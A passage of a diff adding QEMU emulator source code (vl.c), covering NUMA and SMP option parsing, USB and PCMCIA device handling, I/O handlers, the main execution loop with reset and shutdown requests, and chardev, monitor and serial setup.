+        if (total) {
+            list[total-1] = '\n';
+        }
+        len = strlen(bootpath) + 1;
+        list = qemu_realloc(list, total + len);
+        memcpy(&list[total], bootpath, len);
+        total += len;
+        qemu_free(bootpath);
+    }
+
+    *size = total;
+
+    return list;
+}
+
+static void numa_add(const char *optarg)
+{
+    char option[128];
+    char *endptr;
+    unsigned long long value, endvalue;
+    int nodenr;
+
+    optarg = get_opt_name(option, 128, optarg, ',') + 1;
+    if (!strcmp(option, "node")) {
+        if (get_param_value(option, 128, "nodeid", optarg) == 0) {
+            nodenr = nb_numa_nodes;
+        } else {
+            nodenr = strtoull(option, NULL, 10);
+        }
+
+        if (get_param_value(option, 128, "mem", optarg) == 0) {
+            node_mem[nodenr] = 0;
+        } else {
+            int64_t sval;
+            sval = strtosz(option, NULL);
+            if (sval < 0) {
+                fprintf(stderr, "qemu: invalid numa mem size: %s\n", optarg);
+                exit(1);
+            }
+            node_mem[nodenr] = sval;
+        }
+        if (get_param_value(option, 128, "cpus", optarg) == 0) {
+            node_cpumask[nodenr] = 0;
+        } else {
+            value = strtoull(option, &endptr, 10);
+            if (value >= 64) {
+                value = 63;
+                fprintf(stderr, "only 64 CPUs in NUMA mode supported.\n");
+            } else {
+                if (*endptr == '-') {
+                    endvalue = strtoull(endptr+1, &endptr, 10);
+                    if (endvalue >= 63) {
+                        endvalue = 62;
+                        fprintf(stderr,
+                            "only 63 CPUs in NUMA mode supported.\n");
+                    }
+                    value = (2ULL << endvalue) - (1ULL << value);
+                } else {
+                    value = 1ULL << value;
+                }
+            }
+            node_cpumask[nodenr] = value;
+        }
+        nb_numa_nodes++;
+    }
+    return;
+}
+
+static void smp_parse(const char *optarg)
+{
+    int smp, sockets = 0, threads = 0, cores = 0;
+    char *endptr;
+    char option[128];
+
+    smp = strtoul(optarg, &endptr, 10);
+    if (endptr != optarg) {
+        if (*endptr == ',') {
+            endptr++;
+        }
+    }
+    if (get_param_value(option, 128, "sockets", endptr) != 0)
+        sockets = strtoull(option, NULL, 10);
+    if (get_param_value(option, 128, "cores", endptr) != 0)
+        cores = strtoull(option, NULL, 10);
+    if (get_param_value(option, 128, "threads", endptr) != 0)
+        threads = strtoull(option, NULL, 10);
+    if (get_param_value(option, 128, "maxcpus", endptr) != 0)
+        max_cpus = strtoull(option, NULL, 10);
+
+    /* compute missing values, prefer sockets over cores over threads */
+    if (smp == 0 || sockets == 0) {
+        sockets = sockets > 0 ? sockets : 1;
+        cores = cores > 0 ? cores : 1;
+        threads = threads > 0 ? threads : 1;
+        if (smp == 0) {
+            smp = cores * threads * sockets;
+        }
+    } else {
+        if (cores == 0) {
+            threads = threads > 0 ? threads : 1;
+            cores = smp / (sockets * threads);
+        } else {
+            threads = smp / (cores * sockets);
+        }
+    }
+    smp_cpus = smp;
+    smp_cores = cores > 0 ? cores : 1;
+    smp_threads = threads > 0 ? threads : 1;
+    if (max_cpus == 0)
+        max_cpus = smp_cpus;
+}
+
+/***********************************************************/
+/* USB devices */
+
+static int usb_device_add(const char *devname)
+{
+    const char *p;
+    USBDevice *dev = NULL;
+
+    if (!usb_enabled)
+        return -1;
+
+    /* drivers with .usbdevice_name entry in USBDeviceInfo */
+    dev = usbdevice_create(devname);
+    if (dev)
+        goto done;
+
+    /* the other ones */
+    if (strstart(devname, "host:", &p)) {
+        dev = usb_host_device_open(p);
+    } else if (!strcmp(devname, "bt") || strstart(devname, "bt:", &p)) {
+        dev = usb_bt_init(devname[2] ? hci_init(p) :
+                        bt_new_hci(qemu_find_bt_vlan(0)));
+    } else {
+        return -1;
+    }
+    if (!dev)
+        return -1;
+
+done:
+    return 0;
+}
+
+static int usb_device_del(const char *devname)
+{
+    int bus_num, addr;
+    const char *p;
+
+    if (strstart(devname, "host:", &p))
+        return usb_host_device_close(p);
+
+    if (!usb_enabled)
+        return -1;
+
+    p = strchr(devname, '.');
+    if (!p)
+        return -1;
+    bus_num = strtoul(devname, NULL, 0);
+    addr = strtoul(p + 1, NULL, 0);
+
+    return usb_device_delete_addr(bus_num, addr);
+}
+
+static int usb_parse(const char *cmdline)
+{
+    int r;
+    r = usb_device_add(cmdline);
+    if (r < 0) {
+        fprintf(stderr, "qemu: could not add USB device '%s'\n", cmdline);
+    }
+    return r;
+}
+
+void do_usb_add(Monitor *mon, const QDict *qdict)
+{
+    const char *devname = qdict_get_str(qdict, "devname");
+    if (usb_device_add(devname) < 0) {
+        error_report("could not add USB device '%s'", devname);
+    }
+}
+
+void do_usb_del(Monitor *mon, const QDict *qdict)
+{
+    const char *devname = qdict_get_str(qdict, "devname");
+    if (usb_device_del(devname) < 0) {
+        error_report("could not delete USB device '%s'", devname);
+    }
+}
+
+/***********************************************************/
+/* PCMCIA/Cardbus */
+
+static struct pcmcia_socket_entry_s {
+    PCMCIASocket *socket;
+    struct pcmcia_socket_entry_s *next;
+} *pcmcia_sockets = 0;
+
+void pcmcia_socket_register(PCMCIASocket *socket)
+{
+    struct pcmcia_socket_entry_s *entry;
+
+    entry = qemu_malloc(sizeof(struct pcmcia_socket_entry_s));
+    entry->socket = socket;
+    entry->next = pcmcia_sockets;
+    pcmcia_sockets = entry;
+}
+
+void pcmcia_socket_unregister(PCMCIASocket *socket)
+{
+    struct pcmcia_socket_entry_s *entry, **ptr;
+
+    ptr = &pcmcia_sockets;
+    for (entry = *ptr; entry; ptr = &entry->next, entry = *ptr)
+        if (entry->socket == socket) {
+            *ptr = entry->next;
+            qemu_free(entry);
+        }
+}
+
+void pcmcia_info(Monitor *mon)
+{
+    struct pcmcia_socket_entry_s *iter;
+
+    if (!pcmcia_sockets)
+        monitor_printf(mon, "No PCMCIA sockets\n");
+
+    for (iter = pcmcia_sockets; iter; iter = iter->next)
+        monitor_printf(mon, "%s: %s\n", iter->socket->slot_string,
+                       iter->socket->attached ? iter->socket->card_string :
+                       "Empty");
+}
+
+/***********************************************************/
+/* I/O handling */
+
+typedef struct IOHandlerRecord {
+    int fd;
+    IOCanReadHandler *fd_read_poll;
+    IOHandler *fd_read;
+    IOHandler *fd_write;
+    int deleted;
+    void *opaque;
+    /* temporary data */
+    struct pollfd *ufd;
+    QLIST_ENTRY(IOHandlerRecord) next;
+} IOHandlerRecord;
+
+static QLIST_HEAD(, IOHandlerRecord) io_handlers =
+    QLIST_HEAD_INITIALIZER(io_handlers);
+
+
+/* XXX: fd_read_poll should be suppressed, but an API change is
+   necessary in the character devices to suppress fd_can_read(). */
+int qemu_set_fd_handler2(int fd,
+                         IOCanReadHandler *fd_read_poll,
+                         IOHandler *fd_read,
+                         IOHandler *fd_write,
+                         void *opaque)
+{
+    IOHandlerRecord *ioh;
+
+    if (!fd_read && !fd_write) {
+        QLIST_FOREACH(ioh, &io_handlers, next) {
+            if (ioh->fd == fd) {
+                ioh->deleted = 1;
+                break;
+            }
+        }
+    } else {
+        QLIST_FOREACH(ioh, &io_handlers, next) {
+            if (ioh->fd == fd)
+                goto found;
+        }
+        ioh = qemu_mallocz(sizeof(IOHandlerRecord));
+        QLIST_INSERT_HEAD(&io_handlers, ioh, next);
+    found:
+        ioh->fd = fd;
+        ioh->fd_read_poll = fd_read_poll;
+        ioh->fd_read = fd_read;
+        ioh->fd_write = fd_write;
+        ioh->opaque = opaque;
+        ioh->deleted = 0;
+    }
+    qemu_notify_event();
+    return 0;
+}
+
+int qemu_set_fd_handler(int fd,
+                        IOHandler *fd_read,
+                        IOHandler *fd_write,
+                        void *opaque)
+{
+    return qemu_set_fd_handler2(fd, NULL, fd_read, fd_write, opaque);
+}
+
+/***********************************************************/
+/* machine registration */
+
+static QEMUMachine *first_machine = NULL;
+QEMUMachine *current_machine = NULL;
+
+int qemu_register_machine(QEMUMachine *m)
+{
+    QEMUMachine **pm;
+    pm = &first_machine;
+    while (*pm != NULL)
+        pm = &(*pm)->next;
+    m->next = NULL;
+    *pm = m;
+    return 0;
+}
+
+static QEMUMachine *find_machine(const char *name)
+{
+    QEMUMachine *m;
+
+    for(m = first_machine; m != NULL; m = m->next) {
+        if (!strcmp(m->name, name))
+            return m;
+        if (m->alias && !strcmp(m->alias, name))
+            return m;
+    }
+    return NULL;
+}
+
+static QEMUMachine *find_default_machine(void)
+{
+    QEMUMachine *m;
+
+    for(m = first_machine; m != NULL; m = m->next) {
+        if (m->is_default) {
+            return m;
+        }
+    }
+    return NULL;
+}
+
+/***********************************************************/
+/* main execution loop */
+
+static void gui_update(void *opaque)
+{
+    uint64_t interval = GUI_REFRESH_INTERVAL;
+    DisplayState *ds = opaque;
+    DisplayChangeListener *dcl = ds->listeners;
+
+    qemu_flush_coalesced_mmio_buffer();
+    dpy_refresh(ds);
+
+    while (dcl != NULL) {
+        if (dcl->gui_timer_interval &&
+            dcl->gui_timer_interval < interval)
+            interval = dcl->gui_timer_interval;
+        dcl = dcl->next;
+    }
+    qemu_mod_timer(ds->gui_timer, interval + qemu_get_clock(rt_clock));
+}
+
+static void nographic_update(void *opaque)
+{
+    uint64_t interval = GUI_REFRESH_INTERVAL;
+
+    qemu_flush_coalesced_mmio_buffer();
+    qemu_mod_timer(nographic_timer, interval + qemu_get_clock(rt_clock));
+}
+
+struct vm_change_state_entry {
+    VMChangeStateHandler *cb;
+    void *opaque;
+    QLIST_ENTRY (vm_change_state_entry) entries;
+};
+
+static QLIST_HEAD(vm_change_state_head, vm_change_state_entry) vm_change_state_head;
+
+VMChangeStateEntry *qemu_add_vm_change_state_handler(VMChangeStateHandler *cb,
+                                                     void *opaque)
+{
+    VMChangeStateEntry *e;
+
+    e = qemu_mallocz(sizeof (*e));
+
+    e->cb = cb;
+    e->opaque = opaque;
+    QLIST_INSERT_HEAD(&vm_change_state_head, e, entries);
+    return e;
+}
+
+void qemu_del_vm_change_state_handler(VMChangeStateEntry *e)
+{
+    QLIST_REMOVE (e, entries);
+    qemu_free (e);
+}
+
+void vm_state_notify(int running, int reason)
+{
+    VMChangeStateEntry *e;
+
+    trace_vm_state_notify(running, reason);
+
+    for (e = vm_change_state_head.lh_first; e; e = e->entries.le_next) {
+        e->cb(e->opaque, running, reason);
+    }
+}
+
+void vm_start(void)
+{
+    if (!vm_running) {
+        cpu_enable_ticks();
+        vm_running = 1;
+        vm_state_notify(1, 0);
+        resume_all_vcpus();
+        monitor_protocol_event(QEVENT_RESUME, NULL);
+    }
+}
+
+/* reset/shutdown handler */
+
+typedef struct QEMUResetEntry {
+    QTAILQ_ENTRY(QEMUResetEntry) entry;
+    QEMUResetHandler *func;
+    void *opaque;
+} QEMUResetEntry;
+
+static QTAILQ_HEAD(reset_handlers, QEMUResetEntry) reset_handlers =
+    QTAILQ_HEAD_INITIALIZER(reset_handlers);
+static int reset_requested;
+static int shutdown_requested;
+static int powerdown_requested;
+int debug_requested;
+int vmstop_requested;
+
+int qemu_no_shutdown(void)
+{
+    int r = no_shutdown;
+    no_shutdown = 0;
+    return r;
+}
+
+int qemu_shutdown_requested(void)
+{
+    int r = shutdown_requested;
+    shutdown_requested = 0;
+    return r;
+}
+
+int qemu_reset_requested(void)
+{
+    int r = reset_requested;
+    reset_requested = 0;
+    return r;
+}
+
+int qemu_powerdown_requested(void)
+{
+    int r = powerdown_requested;
+    powerdown_requested = 0;
+    return r;
+}
+
+static int qemu_debug_requested(void)
+{
+    int r = debug_requested;
+    debug_requested = 0;
+    return r;
+}
+
+static int qemu_vmstop_requested(void)
+{
+    int r = vmstop_requested;
+    vmstop_requested = 0;
+    return r;
+}
+
+void qemu_register_reset(QEMUResetHandler *func, void *opaque)
+{
+    QEMUResetEntry *re = qemu_mallocz(sizeof(QEMUResetEntry));
+
+    re->func = func;
+    re->opaque = opaque;
+    QTAILQ_INSERT_TAIL(&reset_handlers, re, entry);
+}
+
+void qemu_unregister_reset(QEMUResetHandler *func, void *opaque)
+{
+    QEMUResetEntry *re;
+
+    QTAILQ_FOREACH(re, &reset_handlers, entry) {
+        if (re->func == func && re->opaque == opaque) {
+            QTAILQ_REMOVE(&reset_handlers, re, entry);
+            qemu_free(re);
+            return;
+        }
+    }
+}
+
+void qemu_system_reset(void)
+{
+    QEMUResetEntry *re, *nre;
+
+    /* reset all devices */
+    QTAILQ_FOREACH_SAFE(re, &reset_handlers, entry, nre) {
+        re->func(re->opaque);
+    }
+    monitor_protocol_event(QEVENT_RESET, NULL);
+    cpu_synchronize_all_post_reset();
+}
+
+void qemu_system_reset_request(void)
+{
+    if (no_reboot) {
+        shutdown_requested = 1;
+    } else {
+        reset_requested = 1;
+    }
+    if (cpu_single_env) {
+        cpu_single_env->stopped = 1;
+        cpu_exit(cpu_single_env);
+    }
+    qemu_notify_event();
+}
+
+void qemu_system_shutdown_request(void)
+{
+    shutdown_requested = 1;
+    qemu_notify_event();
+}
+
+void qemu_system_powerdown_request(void)
+{
+    powerdown_requested = 1;
+    qemu_notify_event();
+}
+
+void main_loop_wait(int nonblocking)
+{
+    IOHandlerRecord *ioh;
+    fd_set rfds, wfds, xfds;
+    int ret, nfds;
+    struct timeval tv;
+    int timeout;
+
+    if (nonblocking)
+        timeout = 0;
+    else {
+        timeout = qemu_calculate_timeout();
+        qemu_bh_update_timeout(&timeout);
+    }
+
+    os_host_main_loop_wait(&timeout);
+
+    /* poll any events */
+    /* XXX: separate device handlers from system ones */
+    nfds = -1;
+    FD_ZERO(&rfds);
+    FD_ZERO(&wfds);
+    FD_ZERO(&xfds);
+    QLIST_FOREACH(ioh, &io_handlers, next) {
+        if (ioh->deleted)
+            continue;
+        if (ioh->fd_read &&
+            (!ioh->fd_read_poll ||
+             ioh->fd_read_poll(ioh->opaque) != 0)) {
+            FD_SET(ioh->fd, &rfds);
+            if (ioh->fd > nfds)
+                nfds = ioh->fd;
+        }
+        if (ioh->fd_write) {
+            FD_SET(ioh->fd, &wfds);
+            if (ioh->fd > nfds)
+                nfds = ioh->fd;
+        }
+    }
+
+    tv.tv_sec = timeout / 1000;
+    tv.tv_usec = (timeout % 1000) * 1000;
+
+    slirp_select_fill(&nfds, &rfds, &wfds, &xfds);
+
+    qemu_mutex_unlock_iothread();
+    ret = select(nfds + 1, &rfds, &wfds, &xfds, &tv);
+    qemu_mutex_lock_iothread();
+    if (ret > 0) {
+        IOHandlerRecord *pioh;
+
+        QLIST_FOREACH_SAFE(ioh, &io_handlers, next, pioh) {
+            if (!ioh->deleted && ioh->fd_read && FD_ISSET(ioh->fd, &rfds)) {
+                ioh->fd_read(ioh->opaque);
+                if (!(ioh->fd_read_poll && ioh->fd_read_poll(ioh->opaque)))
+                    FD_CLR(ioh->fd, &rfds);
+            }
+            if (!ioh->deleted && ioh->fd_write && FD_ISSET(ioh->fd, &wfds)) {
+                ioh->fd_write(ioh->opaque);
+            }
+
+            /* Do this last in case read/write handlers marked it for deletion */
+            if (ioh->deleted) {
+                QLIST_REMOVE(ioh, next);
+                qemu_free(ioh);
+            }
+        }
+    }
+
+    slirp_select_poll(&rfds, &wfds, &xfds, (ret < 0));
+
+    qemu_run_all_timers();
+
+    /* Check bottom-halves last in case any of the earlier events triggered
+       them.  */
+    qemu_bh_poll();
+
+}
+
+static int vm_can_run(void)
+{
+    if (powerdown_requested)
+        return 0;
+    if (reset_requested)
+        return 0;
+    if (shutdown_requested)
+        return 0;
+    if (debug_requested)
+        return 0;
+    return 1;
+}
+
+qemu_irq qemu_system_powerdown;
+
+static void main_loop(void)
+{
+    int r;
+
+    if (kvm_enabled()) {
+        kvm_main_loop();
+        cpu_disable_ticks();
+        return;
+    }
+
+    qemu_main_loop_start();
+
+    for (;;) {
+        do {
+            bool nonblocking = false;
+#ifdef CONFIG_PROFILER
+            int64_t ti;
+#endif
+#ifndef CONFIG_IOTHREAD
+            nonblocking = cpu_exec_all();
+#endif
+#ifdef CONFIG_PROFILER
+            ti = profile_getclock();
+#endif
+            main_loop_wait(nonblocking);
+#ifdef CONFIG_PROFILER
+            dev_time += profile_getclock() - ti;
+#endif
+        } while (vm_can_run());
+
+        if ((r = qemu_debug_requested())) {
+            vm_stop(r);
+        }
+        if (qemu_shutdown_requested()) {
+            monitor_protocol_event(QEVENT_SHUTDOWN, NULL);
+            if (no_shutdown) {
+                vm_stop(0);
+                no_shutdown = 0;
+            } else
+                break;
+        }
+        if (qemu_reset_requested()) {
+            pause_all_vcpus();
+            qemu_system_reset();
+            resume_all_vcpus();
+        }
+        if (qemu_powerdown_requested()) {
+            monitor_protocol_event(QEVENT_POWERDOWN, NULL);
+            qemu_irq_raise(qemu_system_powerdown);
+        }
+        if ((r = qemu_vmstop_requested())) {
+            vm_stop(r);
+        }
+    }
+    bdrv_close_all();
+    pause_all_vcpus();
+}
+
+static void version(void)
+{
+    printf("QEMU emulator version " QEMU_VERSION QEMU_PKGVERSION ", Copyright (c) 2003-2008 Fabrice Bellard\n");
+}
+
+static void help(int exitcode)
+{
+    const char *options_help =
+#define DEF(option, opt_arg, opt_enum, opt_help, arch_mask)     \
+        opt_help
+#define DEFHEADING(text) stringify(text) "\n"
+#include "qemu-options.def"
+#undef DEF
+#undef DEFHEADING
+#undef GEN_DOCS
+        ;
+    version();
+    printf("usage: %s [options] [disk_image]\n"
+           "\n"
+           "'disk_image' is a raw hard disk image for IDE hard disk 0\n"
+           "\n"
+           "%s\n"
+           "During emulation, the following keys are useful:\n"
+           "ctrl-alt-f      toggle full screen\n"
+           "ctrl-alt-n      switch to virtual console 'n'\n"
+           "ctrl-alt        toggle mouse and keyboard grab\n"
+           "\n"
+           "When using -nographic, press 'ctrl-a h' to get some help.\n",
+           "qemu",
+           options_help);
+    exit(exitcode);
+}
+
+#define HAS_ARG 0x0001
+
+typedef struct QEMUOption {
+    const char *name;
+    int flags;
+    int index;
+    uint32_t arch_mask;
+} QEMUOption;
+
+static const QEMUOption qemu_options[] = {
+    { "h", 0, QEMU_OPTION_h, QEMU_ARCH_ALL },
+#define DEF(option, opt_arg, opt_enum, opt_help, arch_mask)     \
+    { option, opt_arg, opt_enum, arch_mask },
+#define DEFHEADING(text)
+#include "qemu-options.def"
+#undef DEF
+#undef DEFHEADING
+#undef GEN_DOCS
+    { NULL },
+};
+static void select_vgahw (const char *p)
+{
+    const char *opts;
+
+    default_vga = 0;
+    vga_interface_type = VGA_NONE;
+    if (strstart(p, "std", &opts)) {
+        vga_interface_type = VGA_STD;
+    } else if (strstart(p, "cirrus", &opts)) {
+        vga_interface_type = VGA_CIRRUS;
+    } else if (strstart(p, "vmware", &opts)) {
+        vga_interface_type = VGA_VMWARE;
+    } else if (strstart(p, "xenfb", &opts)) {
+        vga_interface_type = VGA_XENFB;
+    } else if (strstart(p, "qxl", &opts)) {
+        vga_interface_type = VGA_QXL;
+    } else if (!strstart(p, "none", &opts)) {
+    invalid_vga:
+        fprintf(stderr, "Unknown vga type: %s\n", p);
+        exit(1);
+    }
+    while (*opts) {
+        const char *nextopt;
+
+        if (strstart(opts, ",retrace=", &nextopt)) {
+            opts = nextopt;
+            if (strstart(opts, "dumb", &nextopt))
+                vga_retrace_method = VGA_RETRACE_DUMB;
+            else if (strstart(opts, "precise", &nextopt))
+                vga_retrace_method = VGA_RETRACE_PRECISE;
+            else goto invalid_vga;
+        } else goto invalid_vga;
+        opts = nextopt;
+    }
+}
+
+static int balloon_parse(const char *arg)
+{
+    QemuOpts *opts;
+
+    if (strcmp(arg, "none") == 0) {
+        return 0;
+    }
+
+    if (!strncmp(arg, "virtio", 6)) {
+        if (arg[6] == ',') {
+            /* have params -> parse them */
+            opts = qemu_opts_parse(qemu_find_opts("device"), arg+7, 0);
+            if (!opts)
+                return  -1;
+        } else {
+            /* create empty opts */
+            opts = qemu_opts_create(qemu_find_opts("device"), NULL, 0);
+        }
+        qemu_opt_set(opts, "driver", "virtio-balloon-pci");
+        return 0;
+    }
+
+    return -1;
+}
+
+char *qemu_find_file(int type, const char *name)
+{
+    int len;
+    const char *subdir;
+    char *buf;
+
+    /* If name contains path separators then try it as a straight path.  */
+    if ((strchr(name, '/') || strchr(name, '\\'))
+        && access(name, R_OK) == 0) {
+        return qemu_strdup(name);
+    }
+    switch (type) {
+    case QEMU_FILE_TYPE_BIOS:
+        subdir = "";
+        break;
+    case QEMU_FILE_TYPE_KEYMAP:
+        subdir = "keymaps/";
+        break;
+    default:
+        abort();
+    }
+    len = strlen(data_dir) + strlen(name) + strlen(subdir) + 2;
+    buf = qemu_mallocz(len);
+    snprintf(buf, len, "%s/%s%s", data_dir, subdir, name);
+    if (access(buf, R_OK)) {
+        qemu_free(buf);
+        return NULL;
+    }
+    return buf;
+}
+
+static int device_help_func(QemuOpts *opts, void *opaque)
+{
+    return qdev_device_help(opts);
+}
+
+static int device_init_func(QemuOpts *opts, void *opaque)
+{
+    DeviceState *dev;
+
+    dev = qdev_device_add(opts);
+    if (!dev)
+        return -1;
+    return 0;
+}
+
+static int chardev_init_func(QemuOpts *opts, void *opaque)
+{
+    CharDriverState *chr;
+
+    chr = qemu_chr_open_opts(opts, NULL);
+    if (!chr)
+        return -1;
+    return 0;
+}
+
+#ifdef CONFIG_VIRTFS
+static int fsdev_init_func(QemuOpts *opts, void *opaque)
+{
+    int ret;
+    ret = qemu_fsdev_add(opts);
+
+    return ret;
+}
+#endif
+
+static int mon_init_func(QemuOpts *opts, void *opaque)
+{
+    CharDriverState *chr;
+    const char *chardev;
+    const char *mode;
+    int flags;
+
+    mode = qemu_opt_get(opts, "mode");
+    if (mode == NULL) {
+        mode = "readline";
+    }
+    if (strcmp(mode, "readline") == 0) {
+        flags = MONITOR_USE_READLINE;
+    } else if (strcmp(mode, "control") == 0) {
+        flags = MONITOR_USE_CONTROL;
+    } else {
+        fprintf(stderr, "unknown monitor mode \"%s\"\n", mode);
+        exit(1);
+    }
+
+    if (qemu_opt_get_bool(opts, "pretty", 0))
+        flags |= MONITOR_USE_PRETTY;
+
+    if (qemu_opt_get_bool(opts, "default", 0))
+        flags |= MONITOR_IS_DEFAULT;
+
+    chardev = qemu_opt_get(opts, "chardev");
+    chr = qemu_chr_find(chardev);
+    if (chr == NULL) {
+        fprintf(stderr, "chardev \"%s\" not found\n", chardev);
+        exit(1);
+    }
+
+    monitor_init(chr, flags);
+    return 0;
+}
+
+static void monitor_parse(const char *optarg, const char *mode)
+{
+    static int monitor_device_index = 0;
+    QemuOpts *opts;
+    const char *p;
+    char label[32];
+    int def = 0;
+
+    if (strstart(optarg, "chardev:", &p)) {
+        snprintf(label, sizeof(label), "%s", p);
+    } else {
+        snprintf(label, sizeof(label), "compat_monitor%d",
+                 monitor_device_index);
+        if (monitor_device_index == 0) {
+            def = 1;
+        }
+        opts = qemu_chr_parse_compat(label, optarg);
+        if (!opts) {
+            fprintf(stderr, "parse error: %s\n", optarg);
+            exit(1);
+        }
+    }
+
+    opts = qemu_opts_create(qemu_find_opts("mon"), label, 1);
+    if (!opts) {
+        fprintf(stderr, "duplicate chardev: %s\n", label);
+        exit(1);
+    }
+    qemu_opt_set(opts, "mode", mode);
+    qemu_opt_set(opts, "chardev", label);
+    if (def)
+        qemu_opt_set(opts, "default", "on");
+    monitor_device_index++;
+}
+
+struct device_config {
+    enum {
+        DEV_USB,       /* -usbdevice     */
+        DEV_BT,        /* -bt            */
+        DEV_SERIAL,    /* -serial        */
+        DEV_PARALLEL,  /* -parallel      */
+        DEV_VIRTCON,   /* -virtioconsole */
+        DEV_DEBUGCON,  /* -debugcon */
+    } type;
+    const char *cmdline;
+    QTAILQ_ENTRY(device_config) next;
+};
+QTAILQ_HEAD(, device_config) device_configs = QTAILQ_HEAD_INITIALIZER(device_configs);
+
+static void add_device_config(int type, const char *cmdline)
+{
+    struct device_config *conf;
+
+    conf = qemu_mallocz(sizeof(*conf));
+    conf->type = type;
+    conf->cmdline = cmdline;
+    QTAILQ_INSERT_TAIL(&device_configs, conf, next);
+}
+
+static int foreach_device_config(int type, int (*func)(const char *cmdline))
+{
+    struct device_config *conf;
+    int rc;
+
+    QTAILQ_FOREACH(conf, &device_configs, next) {
+        if (conf->type != type)
+            continue;
+        rc = func(conf->cmdline);
+        if (0 != rc)
+            return rc;
+    }
+    return 0;
+}
+
+static int serial_parse(const char *devname)
+{
+    static int index = 0;
+    char label[32];
+
+    if (strcmp(devname, "none") == 0)
+        return 0;
+    if (index == MAX_SERIAL_PORTS) {
+        fprintf(stderr, "qemu: too many serial ports\n");
+        exit(1);
+    }
+    snprintf(label, sizeof(label), "serial%d", index);
+    serial_hds[index] = qemu_chr_open(label, devname, NULL);
+    if (!serial_hds[index]) {
+        fprintf(stderr, "qemu: could not open serial device '%s': %s\n",
+                devname, strerror(errno));
+        return -1;
+    }
+    index++;
+    return 0;
+}
+
+static int parallel_parse(const char *devname)
+{
+    static int index = 0;
+    char label[32];
+
+    if (strcmp(devname, "none") == 0)
+        return 0;
+    if (index == MAX_PARALLEL_PORTS) {
+        fprintf(stderr, "qemu: too many parallel ports\n");
+        exit(1);
+    }
+    snprintf(label, sizeof(label), "parallel%d", index);
+    parallel_hds[index] = qemu_chr_open(label, devname, NULL);
+    if (!parallel_hds[index]) {
+        fprintf(stderr, "qemu: could not open parallel device '%s': %s\n",
+                devname, strerror(errno));
+        return -1;
+    }
+    index++;
+    return 0;
+}
+
+static int virtcon_parse(const char *devname)
+{
+    QemuOptsList *device = qemu_find_opts("device");
+    static int index = 0;
+    char label[32];
+    QemuOpts *bus_opts, *dev_opts;
+
+    if (strcmp(devname, "none") == 0)
+        return 0;
+    if (index == MAX_VIRTIO_CONSOLES) {
+        fprintf(stderr, "qemu: too many virtio consoles\n");
+        exit(1);
+    }
+
+    bus_opts = qemu_opts_create(device, NULL, 0);
+    qemu_opt_set(bus_opts, "driver", "virtio-serial");
+
+    dev_opts = qemu_opts_create(device, NULL, 0);
+    qemu_opt_set(dev_opts, "driver", "virtconsole");
+
+    snprintf(label, sizeof(label), "virtcon%d", index);
+    virtcon_hds[index] = qemu_chr_open(label, devname, NULL);
+    if (!virtcon_hds[index]) {
+        fprintf(stderr, "qemu: could not open virtio console '%s': %s\n",
+                devname, strerror(errno));
+        return -1;
+    }
+    qemu_opt_set(dev_opts, "chardev", label);
+
+    index++;
+    return 0;
+}
+
+static int debugcon_parse(const char *devname)
+{   
+    QemuOpts *opts;
+
+    if (!qemu_chr_open("debugcon", devname, NULL)) {
+        exit(1);
+    }
+    opts = qemu_opts_create(qemu_find_opts("device"), "debugcon", 1);
+    if (!opts) {
+        fprintf(stderr, "qemu: already have a debugcon device\n");
+        exit(1);
+    }
+    qemu_opt_set(opts, "driver", "isa-debugcon");
+    qemu_opt_set(opts, "chardev", "debugcon");
+    return 0;
+}
+
+void qemu_add_exit_notifier(Notifier *notify)
+{
+    notifier_list_add(&exit_notifiers, notify);
+}
+
+void qemu_remove_exit_notifier(Notifier *notify)
+{
+    notifier_list_remove(&exit_notifiers, notify);
+}
+
+static void qemu_run_exit_notifiers(void)
+{
+    notifier_list_notify(&exit_notifiers);
+}
+
+void qemu_add_machine_init_done_notifier(Notifier *notify)
+{
+    notifier_list_add(&machine_init_done_notifiers, notify);
+}
+
+static void qemu_run_machine_init_done_notifiers(void)
+{
+    notifier_list_notify(&machine_init_done_notifiers);
+}
+
+static const QEMUOption *lookup_opt(int argc, char **argv,
+                                    const char **poptarg, int *poptind)
+{
+    const QEMUOption *popt;
+    int optind = *poptind;
+    char *r = argv[optind];
+    const char *optarg;
+
+    loc_set_cmdline(argv, optind, 1);
+    optind++;
+    /* Treat --foo the same as -foo.  */
+    if (r[1] == '-')
+        r++;
+    popt = qemu_options;
+    for(;;) {
+        if (!popt->name) {
+            error_report("invalid option");
+            exit(1);
+        }
+        if (!strcmp(popt->name, r + 1))
+            break;
+        popt++;
+    }
+    if (popt->flags & HAS_ARG) {
+        if (optind >= argc) {
+            error_report("requires an argument");
+            exit(1);
+        }
+        optarg = argv[optind++];
+        loc_set_cmdline(argv, optind - 2, 2);
+    } else {
+        optarg = NULL;
+    }
+
+    *poptarg = optarg;
+    *poptind = optind;
+
+    return popt;
+}
+
+int main(int argc, char **argv, char **envp)
+{
+    const char *gdbstub_dev = NULL;
+    int i;
+    int snapshot, linux_boot;
+    const char *icount_option = NULL;
+    const char *initrd_filename;
+    const char *kernel_filename, *kernel_cmdline;
+    char boot_devices[33] = "cad"; /* default to HD->floppy->CD-ROM */
+    DisplayState *ds;
+    DisplayChangeListener *dcl;
+    int cyls, heads, secs, translation;
+    QemuOpts *hda_opts = NULL, *opts;
+    QemuOptsList *olist;
+    int optind;
+    const char *optarg;
+    const char *loadvm = NULL;
+    QEMUMachine *machine;
+    const char *cpu_model;
+    int tb_size;
+    const char *pid_file = NULL;
+    const char *incoming = NULL;
+    int show_vnc_port = 0;
+    int defconfig = 1;
+
+#ifdef CONFIG_SIMPLE_TRACE
+    const char *trace_file = NULL;
+#endif
+    atexit(qemu_run_exit_notifiers);
+    error_set_progname(argv[0]);
+
+    init_clocks();
+
+    qemu_cache_utils_init(envp);
+
+    QLIST_INIT (&vm_change_state_head);
+    os_setup_early_signal_handling();
+
+    module_call_init(MODULE_INIT_MACHINE);
+    machine = find_default_machine();
+    cpu_model = NULL;
+    initrd_filename = NULL;
+    ram_size = 0;
+    snapshot = 0;
+    kernel_filename = NULL;
+    kernel_cmdline = "";
+    cyls = heads = secs = 0;
+    translation = BIOS_ATA_TRANSLATION_AUTO;
+
+    for (i = 0; i < MAX_NODES; i++) {
+        node_mem[i] = 0;
+        node_cpumask[i] = 0;
+    }
+
+    nb_numa_nodes = 0;
+    nb_nics = 0;
+
+    tb_size = 0;
+    autostart= 1;
+
+    /* first pass of option parsing */
+    optind = 1;
+    while (optind < argc) {
+        if (argv[optind][0] != '-') {
+            /* disk image */
+            optind++;
+            continue;
+        } else {
+            const QEMUOption *popt;
+
+            popt = lookup_opt(argc, argv, &optarg, &optind);
+            switch (popt->index) {
